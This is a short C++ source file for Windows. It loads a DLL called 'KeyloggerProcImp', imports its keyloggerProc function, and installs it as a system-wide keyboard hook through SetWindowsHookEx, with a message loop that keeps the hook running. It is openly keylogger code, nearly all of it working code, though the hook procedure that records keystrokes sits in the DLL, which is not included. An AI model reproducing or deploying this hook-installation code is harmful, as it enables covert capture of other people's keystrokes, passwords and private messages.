#include <Windows.h>
#include <iostream>

void printError(char const* msg) {
    int errorCode = GetLastError();
    printf("ERROR (%d): %s\n", errorCode, msg);
}

// an approach using SetWindowsHookEx 
int usingWindowHooks(int argc, char const** argv) {
    HMODULE hLib = LoadLibraryA("KeyloggerProcImp");
    if (hLib == NULL) {
        printError("cannot find KeyloggerProcImp.dll");
        return 1;
    }
    // having __stdcall -> becomes demangled name
    HOOKPROC keyloggerProc = (HOOKPROC)GetProcAddress(hLib, "_keyloggerProc@12");
    if (keyloggerProc == NULL) {
        printError("cannot import keyloggerProc");
        return 1;
    }

    HHOOK hHook = SetWindowsHookEx(WH_KEYBOARD, keyloggerProc, hLib, 0);
    if (hHook == NULL) {
        printError("cannot hook keyboard events");
        return 1;
    }
    MSG msg = { };
    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hHook);
    return 0;
}

int main(int argc, char const** argv) {
    return usingWindowHooks(argc, argv);
}